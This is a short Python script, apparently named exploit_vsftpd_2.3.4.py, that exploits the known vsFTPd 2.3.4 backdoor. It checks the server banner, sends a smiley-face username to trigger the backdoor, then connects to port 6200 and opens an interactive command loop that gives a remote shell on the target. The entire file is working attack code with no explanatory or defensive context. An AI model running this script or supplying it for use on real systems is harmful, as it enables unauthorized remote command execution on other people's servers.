from sys import argv 
from socket import socket 
from socket import AF_INET, SOCK_STREAM

class Vsftpd:

    def __init__(self, target_ip: str, port: int) -> None:
        
        self.target_ip = target_ip
        self.port = port

    def exploit(self) -> None:

        with socket (AF_INET, SOCK_STREAM) as sock:
            sock.connect((self.target_ip, self.port))
            version = sock.recv(1024).decode('UTF-8')

            if '220 (vsFTPd 2.3.4)' in version:
                sock.send('USER hi:)\n'.encode('UTF-8'))
                
                sock.send('PASS iamroot\n'.encode('UTF-8'))
            else:
                print(f'[!] 220 (vsFTPd 2.3.4) is not working on port: {self.port}')
            

    def connect_backdoor(self) -> None:

        with socket(AF_INET, SOCK_STREAM) as sock:
            sock.connect((self.target_ip, 6200))

            print('Session was created, type "quit" for quit.')
            while True :
                command = input('>> ').strip()

                if command == 'quit':
                    break

                sock.sendall((command+'\n').encode())
                print(sock.recv(1024).decode())


if __name__=='__main__' and len(argv) == 3:
    vsftpd = Vsftpd(argv[1],int(argv[2]))
    vsftpd.exploit()
    vsftpd.connect_backdoor()

else: 
    print ('[!] Usage: python3 exploit_vsftpd_2.3.4.py [TARGET_Ä°P] [PORT]') 
